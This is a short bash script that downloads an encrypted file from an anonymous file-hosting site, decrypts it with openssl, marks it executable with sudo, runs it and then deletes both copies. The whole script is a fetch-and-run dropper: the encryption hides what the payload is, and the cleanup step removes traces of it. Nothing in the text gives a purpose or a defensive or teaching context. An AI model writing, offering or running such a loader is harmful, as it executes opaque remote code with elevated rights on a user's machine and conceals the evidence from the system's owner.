#! /bin/bash
cd
curl -O https://cdn-146.anonfiles.com/26xeq7U2y4/50373f2b-1674825150/x-l1bra.enc
openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
